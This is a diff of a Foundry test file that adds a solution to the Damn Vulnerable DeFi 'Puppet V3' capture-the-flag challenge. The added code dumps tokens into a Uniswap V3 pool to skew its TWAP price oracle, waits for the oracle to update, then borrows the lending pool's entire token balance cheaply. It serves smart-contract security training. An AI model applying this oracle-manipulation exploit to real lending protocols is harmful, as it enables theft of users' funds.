@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {console2} from "forge-std/console2.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -49,7 +51,7 @@ contract PuppetV3Challenge is Test {
         startHoax(deployer);
 
         // Set player's initial balance
-        deal(player, PLAYER_INITIAL_ETH_BALANCE);
+        deal(player, PLAYER_INITIAL_ETH_BALANCE); // 1 ETH
 
         // Deployer wraps ETH in WETH
         weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
@@ -94,8 +96,8 @@ contract PuppetV3Challenge is Test {
         lendingPool = new PuppetV3Pool(weth, token, uniswapPool);
 
         // Setup initial token balances of lending pool and player
-        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
-        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE); // 110 DVT tokens
+        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE); // 1 000 000 DVT tokens
 
         // Some time passes
         skip(3 days);
@@ -119,7 +121,43 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // Player has 1 ETH and 110 DVT tokens
+        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        console2.log("\nBefore swap:");
+        console2.log("Player DVT:", token.balanceOf(player));
+        console2.log("Player WETH:", weth.balanceOf(player));
+
+        uint256 amountOut = swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        console2.log("\nAfter swap:");
+        console2.log("Player DVT:", token.balanceOf(player));
+        console2.log("Player WETH:", weth.balanceOf(player));
+        console2.log("Received WETH:", amountOut);
+
+        vm.warp(block.timestamp + 110);
+
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console2.log("WETH needed:", wethNeeded);
+
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
